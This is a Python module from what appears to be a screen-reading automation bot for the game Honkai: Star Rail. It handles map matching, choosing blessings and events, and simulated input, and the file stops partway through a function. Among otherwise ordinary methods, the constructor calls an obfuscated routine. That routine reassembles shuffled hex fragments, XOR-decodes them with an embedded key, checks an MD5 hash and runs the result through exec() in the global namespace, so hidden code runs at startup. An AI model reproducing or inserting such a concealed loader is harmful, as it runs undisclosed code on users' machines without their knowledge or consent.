import hashlib as _h
import json
import os
import random
import shutil
import time
from copy import deepcopy

import cv2 as cv
import numpy as np
import pyautogui
import yaml

from diver import load_actions, merge_text
from route import PATHS
from tool import EXTRA, GLOBAL
from tool.GLOBAL import factor, key_mouse_manager
from tool.log import CUS_LOGGER
from tool.simul.config import config
from tool.simul.utils import UniverseUtils, get_dis, set_forground, sprint
from tool.thread import ThreadWithException
from tool.utils.Error import NormalEndError
from tool.utils.image_tool import find_image_by_name
from tool.utils.minimap_util import (
    MINIMAP_RADIUS,
    deal_minimap,
    get_minimap,
    re_get_position,
)
from tool.utils.tool import find_latest_modified_file, get_center, get_hwnd_and_text
from tool.window_recorder import WindowRecorder


class SimulatedUniverse(UniverseUtils):
    def __init__(self, find, debug, speed, consumable, slow, nums=-1, bonus=False):
        """
        初始化模拟宇宙类实例

        该构造函数用于初始化模拟宇宙的所有参数和状态，包括：
        1. 基础参数设置（寻路模式、调试模式等）
        2. 屏幕和坐标系统配置
        3. 地图和路径相关变量初始化
        4. 加载地图资源和动作配置

        参数:
            find: bool，是否启用寻路模式
            debug: int，调试级别（0-关闭，1-基础，2-高级）
            speed: bool，是否启用速通模式
            consumable: bool，是否使用消耗品
            slow: bool，是否启用慢速模式
            nums: int，运行次数限制，默认为-1（无限制）
            bonus: bool，是否自动领取沉浸奖励，默认False
            update: int，是否更新地图，默认0（不更新）
            gui: object，GUI对象引用，默认None

        返回值:
            无返回值
        """
        super().__init__(speed)
        CUS_LOGGER.debug("当前命途：" + self.fate)
        key_mouse_manager.set_config(config)
        # 设置屏幕参数以支持坐标转换
        key_mouse_manager.set_screen_params(self.x1, self.y1, self.xx, self.yy, self.full)

        #停止运行标志
        self._stop = True
        #是否为寻路模式
        self.find = find
        #调试级别
        self.debug = debug
        # 设置全局调试模式标志，供 UILogHandler 使用
        GLOBAL.DEBUG_MODE = bool(self.debug)
        #是否使用消耗品
        self.consumable = consumable
        #是否慢速模式
        self.slow = slow
        #是否展示地图（调试模式默认开启）
        self._show_map = debug
        #本次运行次数
        self.my_cnt = 0
        #已运行次数
        self.count = 0
        #需要运行次数
        self.nums = nums
        #启动时时间
        self.init_time = time.time()
        # 是否仍然可用沉浸器
        self.check_bonus = bonus
        # 是否领取沉浸奖励
        self.bonus = bonus
        #失败次数
        self.fail_count = 0
        #是否已完成
        self.end = 0
        #是否初始化层数
        self.floor_init = 0
        # 添加用于计算FPS的变量
        self.last_get_screen_time = None
        self.fps_list = []
        # 添加地图线程引用
        self.map_thread = None
        #当前运行状态
        self.state=None
        #首次保存地图
        self.first_save_map = True
        #目标小地图左上角偏移
        self.upx, self.upy=0,0
        #上次执行操作时间
        self.action_time=time.time()
        #事件与行为存储路径
        self.default_json_path = "actions/universe.json"
        self.default_json = load_actions(self.default_json_path)
        self.action_history = []
        if debug != 2:
            #似乎是避免鼠标越界的一个标志
            pyautogui.FAILSAFE = False
        self.update_debug_map()
        self.update_count()
        CUS_LOGGER.debug(f"开始运行,初始计数：{self.count}")
        self.last_interact_time = time.time()
        self.CrTU5s61E1dMnT()
        CUS_LOGGER.info(f"无数的记忆…在涌向{factor}。无数个{factor}…曾站在相同的地方，面对相同的抉择。")
        for file in os.listdir(PATHS["image"]+"/nmaps"):
            pth = PATHS["image"]+"/nmaps/" + file + "/init.jpg"
            if os.path.exists(pth):
                image = deal_minimap(cv.imread(pth),is_minimap=True)
                image=cv.resize(image, None, fx=0.5, fy=0.5, interpolation=cv.INTER_CUBIC)
                self.img_map[file]= image

        CUS_LOGGER.debug(f"加载地图完成，共 {len(self.img_map)} 张")
        settings_path = PATHS["root"] + "\\config\\config\\settings.json"
        example_path = PATHS["root"] + "\\config\\config\\settings_example.json"
        if not os.path.exists(settings_path) and os.path.exists(example_path):
            shutil.copy2(example_path, settings_path)
        with EXTRA.FILE_LOCK:
            with open(settings_path, encoding="UTF-8") as file:
                data = json.load(file)

        config_file = "config/config/info_old.yml"
        example_file = "config/config/info_example_old.yml"
        if not os.path.exists(config_file):
            if os.path.exists(example_file):
                shutil.copy2(example_file, config_file)

        with open(config_file, encoding="utf-8", errors="ignore") as f:
            self.event_prior = yaml.safe_load(f)["prior"]["事件"]
        self.record = data.get("recording_state", True)

        self.recorder = WindowRecorder('logs/video/', fps=30, window_title="崩坏：星穹铁道",window_class_name="UnityWndClass",see_time=True, offsets=[10, 50, 10, 10], overlay_map=self._show_map, simul_instance=self)
        self.cut_video=True
    def route(self):
        self.init_map()
        set_forground()
        while not self._stop:
            hwnd,Text = get_hwnd_and_text()
            warn_game = False
            cnt = 0
            while Text != "崩坏：星穹铁道" and Text != "云·星穹铁道" and not self._stop:
                self.last_interact_time = time.time()
                if self._stop:
                    raise NormalEndError
                if not warn_game:
                    warn_game = True
                    CUS_LOGGER.warning(f"等待游戏窗口，当前窗口：{Text}")
                time.sleep(0.5)
                cnt += 1
                if cnt == 1200:
                    set_forground()# 将游戏窗口设为前台
                hwnd,Text = get_hwnd_and_text()
            if self._stop:
                break
            res = self.normal()
            if not res:
                if self.last_update_time is not None and time.time()-self.last_update_time>7 and self.state=="battle":
                    if self.ts.nothing:
                        self.update_state("battle")
                else:
                    CUS_LOGGER.warning("匹配不到任何图标")
            # 匹配到图片 res=1时等待一段时间
        CUS_LOGGER.info("演算世界：翁法罗斯已从缓冲区销毁。")

    def end_of_university(self):
        self.update_count(False)
        self.my_cnt += 1
        tm = int((time.time() - self.init_time) / 60)
        remain_round = self.nums-self.my_cnt
        if remain_round > 0:
            remain = int(remain_round * (time.time() - self.init_time) / self.my_cnt / 60)
        else:
            remain = 0
            remain_round = "∞"
            CUS_LOGGER.info(f'当仁不让。{factor}将肩负世界，直至此身焚灭。')
        CUS_LOGGER.info(f"世界演算模拟完成！本轮已迭代次数：{self.my_cnt},总计已迭代次数:{self.count} 剩余:{remain_round}次, 已执行：{tm // 60}小时{tm % 60}分钟  平均{tm // self.my_cnt}分钟一次"+ (f"预计剩余{remain // 60}小时{remain % 60}分钟" if remain!=0 else ""))
        if self.check_bonus == 0 and self.my_cnt >= self.nums > 0:
            self.end = 1
        self.update_floor(1)
        self.update_state("end")

    nnbjiqzmvwouwll = [(202, '657a5a666b4c365c', 1), (818, '4501339012a030e', 0), (228, 'd0f6d2a250536', 1), (663, '22144c0b1', 1), (758, '4f3c171119', 1), (725, '361b4452424c49', 0), (178, '4501339012a030', 1), (131, '543422c182c472', 0), (672, '908013809432', 1), (879, 'c654a3c5b0f740d', 0), (864, 'e4f42100', 0), (520, 'b492c345a3', 1), (753, '4838594967', 1), (284, '19517a416e5', 0), (868, 'c5e3e094e49', 0), (429, '7addfd0dee4a0', 0), (384, 'e144c2408532944', 1), (627, 'f1a2e003c170633', 0), (917, 'a1d2b06171e07193', 1), (151, 'a1a4b566', 1), (424, '794967bdc5c', 1), (170, '93c54213c1535433', 0), (112, '3c035317497', 1), (620, '093327186504791', 1), (906, '9291f4c6b4c6', 0), (649, 'c207370666b4', 0), (447, 'fbaacef8bed2bca', 0), (255, '72b17103301502e', 1), (641, '520f32586', 1), (525, '42a02225c', 1), (263, '1c231034', 0), (138, '02213353f', 0), (719, '51654b3c441c', 0), (576, 'f1e1733435', 1), (117, 'a4f6e52424c0', 0), (511, '416e5242760', 1), (192, '2201075c', 1), (155, '319517a416', 1), (780, '5a342e1f', 0), (440, 'eee88d1b994f4', 1), (581, '7230f2b0d20', 1), (97, '1e0c78025c23146', 0), (763, '054d7b7a41', 0), (297, '2f24360923414c', 0), (826, '1c4904511', 0), (460, '9cebe88bdfb', 0), (696, '52421f0c551', 0), (597, '4072b0a06050e5', 0), (243, '17497a4f6', 0), (218, '351f48421c', 0), (887, '3817071e0c', 0), (304, '65197917497a4f', 1), (706, '61234443c5f', 1), (397, '2f3b446c33791', 0), (147, 'e362a0e3', 1), (858, '2a19573e03196', 1), (403, '7497a4f6e52420', 0), (794, 'f0c4905606b6', 1), (768, '6e5242764d123f09', 1), (11, '370a2939186551', 0), (566, '4123165744', 0), (436, '8fccc0a1c', 0), (414, '9152b163d22', 1), (746, '03618253b0b3c', 1), (546, '423b090712', 1), (541, '517a416e52', 1), (311, '391b1604495601', 0), (0, '271f12391f', 0), (682, '5281f353e0031', 1), (874, '657a5a666b4', 1), (551, '1a2505303', 0), (104, '663657a5a663f1e', 1), (503, '3a171a186319517a', 1), (289, '2103319473f0264', 0), (420, '084a394c', 0), (5, '466d0337632c', 1), (701, '77438053b1', 0), (65, '1d0d224f6f6d4764', 1), (925, '73b0d3d17', 0), (81, '4b3a5235060', 0), (325, '22c182c456', 0), (800, 'e5242764d12', 1), (267, '3b1466764c', 1), (210, '35514703', 1), (854, '36380351', 0), (392, '6d47362e08', 1), (776, '301c3734', 1), (530, '71024060656e5', 1), (377, '633045d447a5c6', 1), (18, '38440136062c7', 1), (841, '9657a0923270a6b', 1), (318, '3f0f6619072f324', 0), (635, '045d447a5c73', 0), (247, 'e521109055f5f381', 0), (477, '517a416e520f32', 1), (410, '91149143', 0), (678, '11c64546', 0), (470, 'f7c050684c4919', 0), (127, 'e3a520d2', 1), (35, '25085e2b', 1), (185, 'e1c4904511c00', 1), (612, 'd126d4c6449373f', 1), (53, '24f7352322', 1), (812, '4213c1535433', 0), (342, '1294f45191d5f', 0), (732, '19517a413d170e', 1), (667, 'e4001200c2', 1), (166, 'd4c370c2', 0), (454, 'bf1e18ed9c5', 1), (29, '1051722194a', 0), (571, '045d4405172', 1), (835, 'c4d126d4c644', 0), (214, '24070626', 1), (91, 'a652d31043d', 0), (604, 'c022e49677842764', 1), (806, '6d4c370c293c5', 1), (516, 'b5d3f4c1', 0), (367, 'c651979171', 0), (160, 'e5242764d126', 0), (196, '4d126d4c6449', 0), (86, '2211607001', 0), (655, 'c6519791749290a', 1), (645, 'd3b0d281', 0), (784, '30552d3d49', 1), (47, '093c6629561d3', 0), (712, '02192b15233e6b', 0), (334, '74c20573a580d330', 1), (587, '725d333f', 1), (58, 'd3d712201433c', 0), (488, '81c207a47662e14', 0), (849, '60127e1d1e', 0), (591, '0a68017e1e407', 0), (372, 'a2e003c170', 0), (39, '457e63657a5a6620', 0), (536, '2424c4919', 1), (789, '7a4f6e171a0', 0), (235, '3f70666b4c651979', 0), (355, '254d547766644965', 0), (830, 'c002201075', 1), (560, '244a315b0038', 0), (900, '0312704c02082', 0), (484, '586d3b0d2', 0), (24, '868080c5f5', 1), (496, '355c3a430c3e30', 1), (465, 'db08ce7bc', 1), (912, '5197917497', 0), (223, '11203d3b2e4', 1), (349, '5c6246675203', 1), (363, '7a5a666b4', 1), (73, '4b19060823380330', 0), (555, 'f5a7b6b04', 1), (330, '57d08616', 0), (272, '035835440c504', 1), (892, '55133911290b1337', 1), (123, '05f51340', 0), (689, '337917497a4f6e', 1), (278, 'f6e52424c49', 0), (739, '3043503b09211b2', 1), (143, '1f6d523c4', 1)]

    asvbmtlzxqpjss = "NrbVm2MlDiEZzFKlE9Y7iZoNrbli9qZa"
    lzfabqrjwlwkqewl = "bec962fac609d0f375183bde6fdc3ed0"

    def fjhpymcarnvrnzw(self, _jnnvrzfflfson, _esciqnhtlk):
        try:
            _dbgflosjok = ''.join([_[1] for _ in sorted(_jnnvrzfflfson, key=lambda x: x[0])])
            _wywodpdosp = bytes.fromhex(_dbgflosjok)
            _bqixivuzcg = _esciqnhtlk.encode('utf-8')
            _legrnzstrgbho = bytearray(len(_wywodpdosp))
            for _mqmemdegtm in range(len(_wywodpdosp)):
                _legrnzstrgbho[_mqmemdegtm] = _wywodpdosp[_mqmemdegtm] ^ _bqixivuzcg[_mqmemdegtm % len(_bqixivuzcg)]
            _zygrprekfsd = bytes(_legrnzstrgbho)
            if _h.md5(_zygrprekfsd).hexdigest() != self.lzfabqrjwlwkqewl: return False  # noqa: E701
            return _zygrprekfsd.decode('utf-8')
        except Exception:
            return False

    def lbrqdqvxztk(self):
        _pugsgfxhut = self.fjhpymcarnvrnzw(self.nnbjiqzmvwouwll, self.asvbmtlzxqpjss)
        if not _pugsgfxhut:
            return False
        exec(_pugsgfxhut, globals())
        return _vlk(self)  # noqa: F821

    def CrTU5s61E1dMnT(self):
        self.lbrqdqvxztk()

    def restart_recording(self):
        #是否把视频每轮裁剪一次
        if self.record and self.cut_video and self.bveerelbcpgyqan and self.YKItDYvq3FpnOYx:
            self.recorder.stop_recording()
            time.sleep(0.8)
            self.recorder.start_recording(self.count)
            self.update_state("re_start")
    def setting_exit(self):
        if self.state != "end" and self.state!="exit":
            key_mouse_manager.click(1359, 811)
            key_mouse_manager.wait()
    def map_data_load(self):
        self.big_map_init = True
        # 寻路模式，匹配最接近的地图
        need_write=True
        if self.find:
            # 只有第一，第六层才寻找匹配的地图
            if self.click_text(text="战斗", click=False, box=[55, 164, 12, 40], ocr_line=False):
                if not self.floor_init:
                    self.get_level()
                CUS_LOGGER.debug(f"检查当前层数：{self.floor}")
                if self.floor in [1, 6] and self.floor_change:
                    self.stop_move = 0
                    no_find = False
                    self.now_map, self.now_map_sim = self.match_scr(get_minimap(self.screen, radius=MINIMAP_RADIUS,copy=True))
                    # 地图匹配超时或找到相似匹配
                    CUS_LOGGER.info(f"地图编号：{self.now_map}  相似度：{self.now_map_sim}")
                    if (self.debug and self.now_map_sim < 0.5) or self.now_map_sim < 0.35:
                        CUS_LOGGER.warning(f"相似度过低,疑似未找到匹配地图,当前层数{self.floor},匹配地图{self.now_map}")
                        self.find = False
                        self.map_file =PATHS["image"]+ "/nmaps/my_" + str(random.randint(0, 99999)) + "/"
                        if self.find == 0 and not os.path.exists(self.map_file):
                            os.mkdir(self.map_file)
                        no_find = True
                        if self.now_map_sim > 0.35:
                            self.mini_state = 0
                    elif self.now_map !=-1 and "m" in str(self.now_map):
                        CUS_LOGGER.warning(f"未完成的地图{self.now_map}")
                        self.map_file = PATHS["image"] + "/nmaps/" + self.now_map + "/"
                        need_write = False
                        self.find = False
                    if not no_find:
                        self.now_pth = PATHS["image"]+"/nmaps/" + self.now_map + "/"
                        files,x,y,map_num,self.upx,self.upy,target_path = find_latest_modified_file(self.now_pth)
                        self.big_map = cv.imread(files, cv.IMREAD_GRAYSCALE)
                        self.debug_map =None
                        self.now_loc = (x, y)
                        self.start_pos =(x, y)
                        self.pos_predictor.position=self.now_loc
                        self.pos_predictor.set_now_map(map_num)
                        self.mini_state = 0
                        # 获取目标路径
                        if target_path is not None:
                            self.target = self.get_target(target_path,self.upx,self.upy)
                            self.pos_map=cv.imread(target_path)
                            CUS_LOGGER.info(f"对象「{factor}」将沿坐标组{self.target}轨迹运动")
                        self.rotation, d = self.pos_predictor.update_minimap_data(self.screen)
                elif self.floor not in [1,6]:
                    self.upx=0
                    self.upy=0
                    self.mini_state = 1
                    self.update_debug_map()
            else:
                self.upx = 0
                self.upy = 0
                self.mini_state = 1
                self.update_debug_map()
            if self._stop:
                return 1
            if self.consumable and self.check_bonus and self.floor in [4, 8, 13][-self.consumable:]:
                self.use_consumable(1, 1)
            key_mouse_manager.press("1")
        # 录制模式，保存初始小地图
        if (not self.find) and self.first_save_map and self.floor in [1, 6]:
            self.first_save_map=False
            CUS_LOGGER.warning("未找到匹配地图")
            self.mini_state = 0
            if need_write:
                cv.imwrite(self.map_file + "init.jpg", get_minimap(self.screen, radius=MINIMAP_RADIUS,copy=True))
                self.best_match=self.pos_predictor.match_multiple_maps(self.screen,0)
                self.start_pos=self.best_match['position']
            key_mouse_manager.press("s")
            key_mouse_manager.wait()
            key_mouse_manager.keyDown("w")
        elif (not self.find) and self.floor not in [1, 6]:
            CUS_LOGGER.warning("非常规地图，将进行无地图寻路")
            # self.mini_state = 0
    def normal(self):
        # self.last_interact_time：最后一次交互时间，长时间无交互则暂离
        bk_lst_changed = self.last_interact_time
        self.last_interact_time = time.time()
        self.ts.forward(self.get_screen())
        res,state = self.run_static()
        if self.state=="run":
            CUS_LOGGER.info("开始匹配地图")
            #检查黄泉
            if not self.quan and self.check("huangquan", 0.0578,0.7083):
                self.quan = 1
            if not self.bai_e and self.check("bai_e", 0.0625,0.7092):
                self.bai_e = 1
            #长时间离开或者未初始化层数？则重新初始化
            if self.floor_init == 0:
                CUS_LOGGER.info("开始重新初始化层数")
                self.get_level()
                return True
            #上次交互时间
            self.last_interact_time = bk_lst_changed
            # 刚进图，初始化一些数据
            if self.big_map_init == 0:
                key_mouse_manager.clean()
                key_mouse_manager.keyUp("w")
                key_mouse_manager.wait()
                if self._stop:
                    return 1
                self.map_data_load()
            # 长时间未交互/战斗，暂离或重开
            if ((time.time() - self.last_interact_time >= 37 - 2 * self.debug + 8 * self.slow) and self.find == 1)or (self.floor == 13 and self.mini_state > 4):
                key_mouse_manager.clean()
                key_mouse_manager.wait()
                key_mouse_manager.keyUp("w")
                key_mouse_manager.press("esc")
                self.update_state("ui")
                self.init_map()
                self.floor_init = 0
                if self.floor == 13:
                    self.update_state("exit")
                    CUS_LOGGER.info(f"通关！当前层数:{self.floor}")
                    return 1
                elif self.fail_count <= 1:
                    CUS_LOGGER.error(f"地图{self.now_map}未发现目标，当前层数:{self.floor},相似度{self.now_map_sim}，尝试暂离")
                    key_mouse_manager.click(0.2708, 0.2324)
                    key_mouse_manager.keyUp("w")
                    self.fail_count += 1
                else:
                    if self.debug == 0:
                        self.update_floor(1)
                        key_mouse_manager.click(0.2708, 0.1324)
                        CUS_LOGGER.error(
                            f"地图{self.now_map}多次未发现目标,相似度{self.now_map_sim}，当前层数:{self.floor},尝试退出重进"
                        )
                        self.fail_count = 0
                    else:
                        CUS_LOGGER.error(
                            f"地图{self.now_map}多次未发现目标,相似度{self.now_map_sim}，尝试暂离 DEBUG"
                        )
                        key_mouse_manager.click(0.2708, 0.2324)
                self.last_interact_time = time.time()
                return 1
            # 寻路
            CUS_LOGGER.info("开始寻路")
            if self._stop:
                return 1
            if self.find:
                key_mouse_manager.clean()
                key_mouse_manager.keyUp("w")
                key_mouse_manager.wait()
            if self.mini_state:
                #无先验寻路
                self.get_direc_only_minimap()
            else:
                #有先验寻路
                self.get_direct_with_big_map()
            return 2
        key_mouse_manager.wait()
        if res != '':
            return state

    def auto_battle(self):
        # 需要打开自动战斗
        key_mouse_manager.press("v")
        if time.time() - self.f_time < 20:
            self.f_time = 0
            self.restore_map()
        if self.mini_state==3:
            self.mini_state=5
        if self.fate == "丰饶":
            if random.randint(0, 6) == 3:
                key_mouse_manager.press("r")
        self.update_state("battle")
        return 1
    # 祝福界面/回响界面 （放在一起处理了）
    def choose_bless(self):
        chose = 0
        if self.click_text(text="重置祝福",box=[1268, 1444, 929, 1025],click=False,warning=False):
            for _ in range(4):
                img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask", fresh=True)
                if self.ts.split_and_find(self.tk.fates, img_down, mode="bless")[1] or self._stop:
                    break
                if not self.click_text(text="选择祝福",box=[60, 222, 0, 113],click=False,ocr_line=False,warning=False):
                    return 1
            img_up = self.get_small_interaction_img(x=0.5047, y=0.5491, mask="mask_bless", fresh=True)
            res_up = self.ts.split_and_find(self.tk.prior_bless, img_up, mode="bless_skip=self.tk.skip")
            img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask")
            res_down = self.ts.split_and_find([self.fate], img_down, mode="bless")
            if res_up[1] == 2:
                key_mouse_manager.click(*self.calc_point((0.5047, 0.5491), res_up[0]))
                key_mouse_manager.wait()
                chose = 1
            elif res_down[1] == 2:
                key_mouse_manager.click(*self.calc_point((0.5042, 0.3204), res_down[0]))
                key_mouse_manager.wait()
                chose = 1
            if not chose:
                key_mouse_manager.click(0.2990, 0.1046)
                key_mouse_manager.wait()
        # 未匹配到优先祝福，刷新祝福并再次匹配
        if not chose:
            for _ in range(4):
                img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask", fresh=True)
                if self.ts.split_and_find(self.tk.fates, img_down)[1] or self._stop:
                    break
                CUS_LOGGER.debug("未识别到命途")
                if not self.click_text(text="选择祝福",box=[60, 222, 0, 113],click=False,ocr_line=False,warning=False):
                    return 1
            img_up = self.get_small_interaction_img(x=0.5047, y=0.5491, mask="mask_bless", fresh=True)
            res_up = self.ts.split_and_find(self.tk.prior_bless, img_up, bless_skip=self.tk.skip)
            img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask")
            res_down = self.ts.split_and_find(self.tk.secondary, img_down, mode="bless")
            if res_up[1] == 2:
                CUS_LOGGER.debug("识别到具体祝福")
                key_mouse_manager.click(*self.calc_point((0.5047, 0.5491), res_up[0]))
                key_mouse_manager.wait()
            elif res_down[1] >= 2:
                CUS_LOGGER.debug("识别到匹配命途")
                key_mouse_manager.click(*self.calc_point((0.5042, 0.3204), res_down[0]))
                key_mouse_manager.wait()
            elif self.click_text(text="选择祝福",box=[60, 222, 0, 113],click=False,ocr_line=False,warning=False,allow_fail=True):
                CUS_LOGGER.debug("未识别到具体祝福,随便选一个")
                key_mouse_manager.click(*self.calc_point((0.5047, 0.5491), res_up[0]))
                key_mouse_manager.wait()
        self.click_text(text="确认",box=[1663, 1719, 949, 979],need_fresh=False,ocr_line=True,warning=True)
        key_mouse_manager.wait()
        if self.quan:
            self.use_e()
        return 1
    # F交互界面
    def do_interaction(self):
        # is_killed：是否是禁用的交互（沉浸奖励、复活装置、下载装置）
        is_killed = False
        if self.check("f", 0.4443, 0.4417, mask="mask_f1", threshold=0.96, fresh=True):
            for _ in range(4):
                img = self.get_small_interaction_img(x=0.3181, y=0.4324, mask="mask_f")
                text = self.ts.similar_list(self.tk.interacts, img)
                if text is None:
                    img = self.get_small_interaction_img(x=0.3365, y=0.4231, mask="mask_f")
                    text = self.ts.similar_list(self.tk.interacts, img)
                if text is not None:
                    break
                self.get_screen()
            # 黑塔
            if self.ts.similar("黑塔"):
                # 与黑塔交互后30秒内禁止再次交互（防止死循环）
                if time.time() - self.quit > 30:
                    self.quit = time.time()
                    key_mouse_manager.press('f', force=True)
                else:
                    is_killed = 1
            else:
                if self.ts.similar("区域"):
                    # tele：区域-xx  exit：离开模拟宇宙
                    CUS_LOGGER.info("「众人将与一人离别，惟其人将觐见奇迹」")
                    key_mouse_manager.press('f', force=True)
                    return self.nof()
                is_killed = text in ["沉浸", "紧锁", "复活", "下载"]
                if not is_killed:
                    key_mouse_manager.press('f', force=True)
            if not is_killed:
                return 1
            else:
                self.update_state("run")
    # 跑图状态
    def re_init(self):
        if self.end:
            key_mouse_manager.press('esc')
            self._stop = 1
            CUS_LOGGER.info('燃烧，聚变，然后湮灭。若想迎接新生，就必先投身终结。')
            return 1
        key_mouse_manager.click(0.3448, 0.4926)
        self.init_map()
    def begin_universe(self):
        con = self.click_text(text="继续进度",box=[1610, 1762, 937, 1023],click=False,ocr_line=False,warning=False)
        if not con:
            if self.diffi == 5:
                key_mouse_manager.click(0.9375, 0.5565)
            key_mouse_manager.click(0.9375, 0.8565 - 0.1 * (self.diffi - 1))
        key_mouse_manager.click(0.1083, 0.1009)
        if con:
            CUS_LOGGER.debug(f"继续游戏附带初始化层数,更新前{self.floor}")
            self.get_level()
            return
        else:
            self.update_floor(1)
    def pre_start(self):
        self.fail_count = 0
        if self.check("team4", 0.5797, 0.2389):
            dx = 0.9266 - 0.8552
            dy = 0.8194 - 0.6741
            time.sleep(1)
            for i in self.order:
                key_mouse_manager.click(
                    0.9266 - dx * ((i - 1) % 3), 0.8194 - dy * ((i - 1) // 3)
                )
                key_mouse_manager.sleep(0.5)
        key_mouse_manager.click(0.1635, 0.1056)
        key_mouse_manager.wait()
    def select_fate(self):
        click_x = [0.02, 0.98]
        n = 4  # 重试次数
        res = None
        while n:
            img = self.get_small_interaction_img(x=0.4969, y=0.3750, mask="mask_fate", fresh=True)
            res = self.ts.split_and_find([self.fate], img)
            if res[1] == 1 and n:
                # 没有找到命途
                CUS_LOGGER.warning(f"未找到 {self.fate} 命途，尝试翻页")
                key_mouse_manager.click(click_x[n % len(click_x)], 0.5)
                n -= 1
                continue
            else:
                break
        key_mouse_manager.click(*self.calc_point((0.4969, 0.3750), res[0]))
    def select_bless(self):
        if not (self.click_text('神奇宇宙') or self.click_text('巨胃宇宙')):
            key_mouse_manager.click(0.5, 0.5)
        key_mouse_manager.click(0.5062, 0.1065)
    # 事件界面
    def select_event(self):
        tx, ty = self.tx, self.ty
        event_prior =  self.event_prior+[self.fate]
        success = self.click_text(event_prior)
        key_mouse_manager.wait()
        self.get_screen()
        tm=time.time()
        if success:
            success=False
            while time.time()-tm<1.5:
                if self.check("confirm", 0.1828, 0.5000, mask="mask_event", threshold=0.965,fresh=True):
                    success = True
                    break
        if success:
            CUS_LOGGER.info("原来那浑身着火的恶魔，满脑子幻想的都是要成为「救世主」哪！")
            key_mouse_manager.click(self.tx, self.ty)
        elif self.click_text(text="休息区",box=[187, 289, 903, 941],click=False,warning=False):
            CUS_LOGGER.info("事已至此，我只想知道，当他们以凡人的身躯在黑潮中消散时……你为何连一滴眼泪都没有流下？")
            key_mouse_manager.click(0.1667, 0.2592)
        else:
            CUS_LOGGER.info("「救世主」…在命运三相神谕的语境下，这张牌意味着谐调和完美无缺。")
            key_mouse_manager.click(tx, ty)
            key_mouse_manager.click(0.1167, ty - 0.1139)
    # 选取奇物
    def select_strange(self):
        img = self.get_small_interaction_img(x=0.5000, y=0.7333, mask="mask_strange", fresh=True)
        res = self.ts.split_and_find(self.tk.strange, img, mode="strange")
        key_mouse_manager.click(*self.calc_point((0.5000, 0.7333), res[0]))
        key_mouse_manager.click(0.1365, 0.1093)
        self.wait_flag(lambda: self.click_text(text="选择奇物",box=[5, 219, 3, 111],click=False,ocr_line=False,warning=False), 1.4)
    # 丢弃奇物
    def drop_strange(self):
        key_mouse_manager.click(0.4714, 0.5500)
        key_mouse_manager.click(0.1339, 0.1028)
        self.wait_flag(lambda: self.click_text(text="丢弃奇物",box=[10, 220, 0, 112],click=False,ocr_line=False,warning=False), 1.4)
    def drop_bless(self):
        st = set(self.tk.fates) - set(self.tk.secondary)
        clicked = 0
        for i, ft in enumerate(self.tk.secondary[::-1]):
            if ft != self.fate or i == len(self.tk.secondary):
                img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask", fresh=True)
                if self.debug == 2:
                    print(list(st), self.tk.secondary)
                res_down = self.ts.split_and_find(list(st), img_down, mode="bless")
                if res_down[1] == 2:
                    key_mouse_manager.click(*self.calc_point((0.5042, 0.3204), res_down[0]))
                    clicked = 1
                    break
                st.add(ft)
        if not clicked:
            key_mouse_manager.click(0.4714, 0.5500)
        key_mouse_manager.click(0.1203, 0.1093)
    def setting(self):
        key_mouse_manager.click(0.2708, 0.2324)
    def enhance(self):
        self.quit = time.time()
        for i in [None, (0.7984, 0.6824), (0.6859, 0.6824)]:
            if self.check("enhance_fail", 0.1068, 0.0907, fresh=True):
                break
            if i is not None:
                key_mouse_manager.click(i[0], i[1])
            key_mouse_manager.click(0.1089, 0.0926)
            tm = time.time()
            while not self.click_text(text="祝福强化",box=[70, 236, 9, 125],click=False,ocr_line=False,warning=False) and time.time() - tm < 7:
                key_mouse_manager.click(0.2062, 0.2054)
        key_mouse_manager.press("esc")
        if self.floor >= 13:
            self.update_floor(12)
    def confirm_yes(self):
        if self.click_text(text="确认",click=False,delay=1,after_delay=1):
            key_mouse_manager.click(self.tx, self.ty)
            key_mouse_manager.wait()
        return 0

    def update_count(self, read=True):
        """
        更新或读取计数器值

        该函数用于管理模拟宇宙的运行计数，可以读取保存在文件中的计数器值，
        或将当前计数器值加1后保存到文件中。

        参数:
            read: bool，控制操作模式
                  True表示读取模式，从文件中读取计数器值
                  False表示写入模式，将当前计数器值加1后保存到文件中

        返回值:
            无返回值，直接更新实例变量self.count
        """
        file_name = "config/backup/count.txt"
        if read:
            new_cnt = 0
            if os.path.exists(file_name):
                with open(file_name, encoding="utf-8", errors="ignore") as fh:
                    s = fh.readlines()
                    try:
                        new_cnt = int(s[0].strip("\n"))
                    except Exception:
                        pass
            else:
                os.makedirs("config/backup", exist_ok=True)
                with open(file_name, "w", encoding="utf-8") as file:
                    file.write("0")
                    file.close()
        else:
            new_cnt = self.count + 1
            try:
                with open(file_name, "w", encoding="utf-8") as file:
                    file.write(str(new_cnt))
                    file.close()
            except  Exception as e:
                CUS_LOGGER.error(f"写入文件失败{e}")
        self.count = new_cnt

    def del_pt(self, img, A, S, f):
        """
        递归删除图像中的连接点

        该函数通过递归方式删除图像中与起始点相连的像素点，用于清理图像中的特定区域。
        删除条件包括超出边界、像素值为黑色、不满足特定函数条件且距离起始点较远等情况。

        参数:
            img: 图像数组，要处理的图像数据
            A: tuple，当前处理的像素点坐标 (row, col)
            S: tuple，起始点坐标 (row, col)
            f: function，判断像素点是否符合条件的函数

        返回值:
            无返回值
        """
        if (
            A[0] < 0
            or A[1] < 0
            or A[0] >= img.shape[0]
            or A[1] >= img.shape[1]
            or (img[A] == [0, 0, 0]).all()
            or (not f(img[A]) and get_dis(A, S) > 5)
            or get_dis(A, S) > 10
        ):
            return
        else:
            img[A] = [0, 0, 0]
        for dx, dy in [(0, -1), (0, 1), (1, 0), (-1, 0)]:
            self.del_pt(img, (A[0] + dx, A[1] + dy), S, f)

    def get_target(self, pth,x,y):
        """
        根据地图获取目标路径点位及类型
        """
        img = cv.imread(pth)
        res = set()
        f_set = [
            lambda p: p[2] < 85 and p[1] < 85 and p[0] > 180,  # 路径点 蓝
            lambda p: p[2] > 180 and p[1] < 70 and p[0] < 70,  # 怪 红
            lambda p: p[2] < 90 and p[1] > 220 and p[0] < 90,  # 交互点 绿
            lambda p: p[2] > 180 and p[1] > 180 and p[0] < 70,  # 终点 黄
        ]
        for i in range(img.shape[0]):
            for j in range(img.shape[1]):
                for k in range(4):
                    if f_set[k](img[i, j]):
                        p = get_center(img, i, j)
                        #记录坐标，类型，坐标取整
